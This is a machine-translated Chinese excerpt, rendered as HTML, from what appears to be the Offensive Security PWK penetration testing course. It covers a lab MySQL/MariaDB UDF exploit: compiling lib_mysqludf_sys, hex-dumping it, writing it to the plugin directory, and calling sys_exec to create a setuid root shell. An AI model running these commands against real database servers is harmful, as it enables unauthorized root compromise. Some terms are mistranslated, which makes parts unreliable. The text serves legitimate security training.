<div style="position:absolute;top:200384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sys_exec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">就像之前的漏洞利用一样。</font><font style="vertical-align: inherit;">我们需要创建一个具有相同功能的 MySQL 函数</font></font></nobr></div>
<div style="position:absolute;top:200403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name 以便从数据库执行系统命令。</font></font></nobr></div>
<div style="position:absolute;top:200436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经查看了代码，我们将编译共享库。</font></font></nobr></div>
<div style="position:absolute;top:200468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看install.sh文件，作为编译的前提我们需要安装</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">libmysqlclient15-</font></font></i></nobr></div>
<div style="position:absolute;top:200488;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在 Kali Linux 中，这是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">default-libmysqlclient-dev</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包，可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:200523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/lib_mysqludf_sys$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt update &amp;&amp; sudo apt install default-libmysqlclie</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:200540;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nt-dev</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:200559;left:355"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 911 - 安装依赖项</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:200779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">733 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2020），https://www.exploit-db.com/exploits/1518</font></font></font></nobr></div>
<div style="position:absolute;top:200799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">734 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（阿诺德·贾斯尼，2013 年），https://github.com/mysqludf/lib_mysqludf_sys</font></font></font></nobr></div>
<div style="position:absolute;top:200819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">735 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（cplusplus.com，2019），http://www.cplusplus.com/reference/cstdlib/system/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:200947;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="170"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 170 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:200980;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:202057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:202057;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:202057;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">787</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:201070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.3.2.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:201091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经安装了依赖项，我们需要在之前删除旧的目标文件</font></font></nobr></div>
<div style="position:absolute;top:201110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成新的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/lib_mysqludf_sys$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rm lib_mysqludf_sys.so</font></font></font></b></nobr></div>
<div style="position:absolute;top:201164;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 912 - 删除预构建的二进制文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:201194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看 Makefile，我们需要做一些小的调整以确保我们可以编译</font></font></nobr></div>
<div style="position:absolute;top:201213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">源文件正确。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LIBDIR=/usr/lib</font></font></nobr></div>
<div style="position:absolute;top:201282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装：</font></font></nobr></div>
<div style="position:absolute;top:201299;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc -Wall </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-I/usr/include/mysql</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> -I. </font><font style="vertical-align: inherit;">-shared lib_mysqludf_sys.c -o $(LIBDIR)/lib</font></font></nobr></div>
<div style="position:absolute;top:201316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_mysqludf_sys.so</font></font></nobr></div>
<div style="position:absolute;top:201335;left:365"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 913 - UDF 库 Makefile</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:201365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具体来说，我们需要调整</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的包含目录路径，</font><font style="vertical-align: inherit;">因为我们有一个</font></font></nobr></div>
<div style="position:absolute;top:201384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB 安装在我们的 Kali 系统上，而不是 MySQL 系统上。</font><font style="vertical-align: inherit;">对 Makefile 的更改是</font></font></nobr></div>
<div style="position:absolute;top:201403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 914 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/lib_mysqludf_sys$ &lt;/span&gt;cat Makefile&lt;/span&gt;</font></font></nobr></div>
<div style="position:absolute;top:201455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LIBDIR=/usr/lib    </font></font></nobr></div>
<div style="position:absolute;top:201472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装：    </font></font></nobr></div>
<div style="position:absolute;top:201489;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc -Wall </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:201506;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/mariadb/server/private -I. </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/lib_mysqludf_sys$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">make</font></font></font></b></nobr></div>
<div style="position:absolute;top:201557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb</font></font></nobr></div>
<div style="position:absolute;top:201574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/server/private -I. </font><font style="vertical-align: inherit;">-shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so</font></font></nobr></div>
<div style="position:absolute;top:201593;left:349"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 914 - 编译 UDF 库</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:201623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-Wall</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志启用所有海湾合作委员会的警告消息，并且</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-I</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含头文件的目录。</font></font></nobr></div>
<div style="position:absolute;top:201642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 914 中的命令中包含的列表是头文件的常见位置</font></font></nobr></div>
<div style="position:absolute;top:201662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">玛丽亚数据库。</font><font style="vertical-align: inherit;">所述</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-shared</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志告诉GCC这是共享库，并生成一个共享对象文件。</font></font></nobr></div>
<div style="position:absolute;top:201681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">告诉 gcc 输出文件的位置。</font></font></nobr></div>
<div style="position:absolute;top:201714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 UDF 漏洞中调用 SQL 命令，将共享库传输到目标</font></font></nobr></div>
<div style="position:absolute;top:201733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库服务器，我们将需要该文件作为十六进制转储。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择@@plugin_dir</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:201785;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择二进制 0xshellcode 到转储文件@@plugin_dir;</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建函数 sys_exec 返回 int soname udf_filename;</font></font></nobr></div>
<div style="position:absolute;top:201819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select * from mysql.func where name='sys_exec' \G</font></font></nobr></div>
<div style="position:absolute;top:201836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')</font></font></nobr></div>
<div style="position:absolute;top:201855;left:340"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 915 - MySQL 漏洞利用分解</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:201885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们可以使用以下命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/lib_mysqludf_sys$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xxd -p lib_mysqludf_sys.so | </font><font style="vertical-align: inherit;">tr -d '\n' &gt; lib_mysqludf_s</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:201936;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ys.so.hex</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:201956;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 916 - 创建库的十六进制转储 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:202135;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="171"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 171 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:202168;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:203245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:203245;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:203245;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">788</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:202264;left:109"><nobr><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xxd</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令用于制作</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">十六进制</font></font></b><font style="vertical-align: inherit;">转储，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志输出一个普通</font><font style="vertical-align: inherit;">的</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">十六进制</font></font></b><font style="vertical-align: inherit;">转储，</font></font></nobr></div>
<div style="position:absolute;top:202283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更容易进行进一步的操作。</font><font style="vertical-align: inherit;">我们用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tr</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除换行符然后dump</font></font></nobr></div>
<div style="position:absolute;top:202303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出内容到一个名为 lib_mysqludf_sys.so.hex 的文件。</font></font></nobr></div>
<div style="position:absolute;top:202335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lib_mysqludf_sys.so.hex 文件的内容是我们将用于 shellcode 的内容。</font></font></nobr></div>
<div style="position:absolute;top:202368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们拥有尝试利用 Zora 所需的一切。</font><font style="vertical-align: inherit;">现在我们只需要把它放在一起。</font></font></nobr></div>
<div style="position:absolute;top:202388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在开始运行恶意 SQL 命令之前，我们将在 MariaDB 中为</font></font></nobr></div>
<div style="position:absolute;top:202407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳代码。</font><font style="vertical-align: inherit;">该变量的内容是从 lib_mysqludf_sys.so.hex 文件中获得的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:202442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [（无）]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置@shell = </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x </font></font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7f454c4602010100000000000000000003003e000100000000110</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:202459;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">000000000004000000000000000e03b000000000000000000040003800090040001c001b0001000000040</font></font></b></nobr></div>
<div style="position:absolute;top:202476;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00000000000...00000000000000000000；</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:202495;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 917 - 创建一个 64 位 shellcode 变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:202524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意在 shellcode 的开头添加了“0x”并且没有单引号或双引号。</font></font></nobr></div>
<div style="position:absolute;top:202544;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这对于 MariaDB 以二进制形式读取文本是必要的。</font><font style="vertical-align: inherit;">接下来，根据漏洞利用说明，我们将</font></font></nobr></div>
<div style="position:absolute;top:202563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确认插件目录的位置。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:202598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(无)]&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择@@plugin_dir;</font></font></font></b></nobr></div>
<div style="position:absolute;top:202615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+--------------------+</font></font></nobr></div>
<div style="position:absolute;top:202632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">@@plugin_dir |</font></font></nobr></div>
<div style="position:absolute;top:202649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+--------------------+</font></font></nobr></div>
<div style="position:absolute;top:202666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/home/dev/plugin/ |</font></font></nobr></div>
<div style="position:absolute;top:202683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+--------------------+</font></font></nobr></div>
<div style="position:absolute;top:202700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 行（0.072 秒）</font></font></nobr></div>
<div style="position:absolute;top:202719;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 918 - 验证 plugin_dir</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:202748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如预期的那样，插件目录在 /home/dev/plugin/ 中。</font><font style="vertical-align: inherit;">接下来，我们需要将shellcode输出到</font></font></nobr></div>
<div style="position:absolute;top:202768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zora 上的文件。</font><font style="vertical-align: inherit;">原始漏洞利用为此生成一个随机文件名，但我们可以将其命名为</font></font></nobr></div>
<div style="position:absolute;top:202787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无论我们想要什么。</font><font style="vertical-align: inherit;">清单 919 中的命令告诉 MariaDB 处理</font><i><font style="vertical-align: inherit;">@shell</font></i><font style="vertical-align: inherit;">的内容</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:202807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量作为二进制并将其输出到 /home/dev/plugin/udf_sys_exec.so 文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:202841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [(none)]&gt; 选择二进制@shell 到转储文件 '/home/dev/plugin/udf_sys_exec.so</font></font></nobr></div>
<div style="position:absolute;top:202859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">';</font></font></nobr></div>
<div style="position:absolute;top:202876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误 1045 (28000)：用户 'wp'@'%' 访问被拒绝（使用密码：是）</font></font></nobr></div>
<div style="position:absolute;top:202892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MariaDB [（无）]&gt;</font></font></nobr></div>
<div style="position:absolute;top:202912;left:348"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 919 - 将 shell 转储到文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:202941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，这是我们遇到第一个问题的地方。</font><font style="vertical-align: inherit;">根据上面的错误信息，</font></font></nobr></div>
<div style="position:absolute;top:202960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wp 用户没有创建文件的权限。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:202995;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.3.2.2 我们失败的原因</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:203029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然用户确实有权运行 SELECT、INSERT、UPDATE 和 DELETE，但 wp 用户</font></font></nobr></div>
<div style="position:absolute;top:203049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缺少</font><font style="vertical-align: inherit;">允许运行</font><i><font style="vertical-align: inherit;">dumpfile</font></i><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FILE</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限</font><font style="vertical-align: inherit;">。</font><font style="font-size:8px"><font style="vertical-align: inherit;">736</font></font><font style="vertical-align: inherit;">要运行</font><i><font style="vertical-align: inherit;">转储文件，</font></i><font style="vertical-align: inherit;">我们需要一个用户</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:203068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有更高级别权限的帐户，例如 root 用户。</font><font style="vertical-align: inherit;">没有这个，我们就被卡住了</font></font></nobr></div>
<div style="position:absolute;top:203087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用当前的方法无法继续利用 Zora。</font><font style="vertical-align: inherit;">第一个逻辑选项</font></font></nobr></div>
<div style="position:absolute;top:203107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我想到的是回到 Ajla，看看我们是否可以找到 root（或类似的）MariaDB 凭据。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:203195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">736 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（MariaDB，2020），https://mariadb.com/kb/en/library/grant/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:203323;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="172"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 172 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:203356;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:204433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:204433;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:204433;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">789</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:203452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.4 Web应用服务器的深入枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:203493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这一轮枚举中，我们的目标是找到一些能让我们获得更高水平的东西。</font></font></nobr></div>
<div style="position:absolute;top:203513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问 Zora 的 MariaDB 服务。</font><font style="vertical-align: inherit;">虽然我们可以继续尝试用我们当前的方式枚举 Ajla</font></font></nobr></div>
<div style="position:absolute;top:203532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户，www-data，我们相信更高级别的权限会非常有帮助。</font><font style="vertical-align: inherit;">这就是为什么我们</font></font></nobr></div>
<div style="position:absolute;top:203552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将首先将我们的枚举工作集中在特权升级上，然后我们将继续</font></font></nobr></div>
<div style="position:absolute;top:203571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">寻找凭据。</font><font style="vertical-align: inherit;">为了寻找特权升级向量，我们需要回到我们的</font></font></nobr></div>
<div style="position:absolute;top:203590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ajla 上的 Meterpreter Shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:203625;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.4.1</font></font></i></nobr></div>
<div style="position:absolute;top:203625;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更彻底的后期开发</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:203662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之前，我们了解到 Ajla 在 Ubuntu 16.04 上运行，这是一个相当新的版本。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
